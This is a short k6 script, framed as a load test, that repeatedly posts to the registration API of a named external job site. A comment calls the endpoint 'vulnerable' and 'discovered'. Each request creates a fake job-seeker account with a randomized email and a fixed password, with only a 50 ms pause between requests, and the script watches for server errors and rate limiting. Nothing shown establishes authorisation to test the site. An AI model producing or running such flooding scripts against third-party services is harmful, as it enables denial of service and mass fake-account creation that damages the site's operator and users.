import http from 'k6/http';
import { sleep, check } from 'k6';

// The vulnerable registration endpoint you discovered
const TARGET_API_URL = 'https://silkhire.uz/api/auth/register'; 

export default function () {
    // Generate organic, randomized data for every single request
    const randomNum = Math.floor(Math.random() * 900000) + 100000;
    const fakeEmail = `heavy.load.test.${randomNum}.${Date.now()}@gmail.com`;
    
     const payload = JSON.stringify({
        firstName: 'Load',
        lastName: `Tester${randomNum}`,
        email: fakeEmail,
        password: 'TestSecure123!',
        role: 'job_seeker'
    });

    const params = {
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
    };

    // Fire the raw network request
    const response = http.post(TARGET_API_URL, payload, params);

    // Track how the server responds under pressure
    check(response, {
        'Success (201 Created)': (r) => r.status === 201 || r.status === 200,
        'Failed (500 Server Error)': (r) => r.status === 500,
        'Rate Limited (429 Too Many Requests)': (r) => r.status === 429,
    });

    // A microscopic 50ms buffer to keep the GitHub Action runner stable
    sleep(0.05); 
}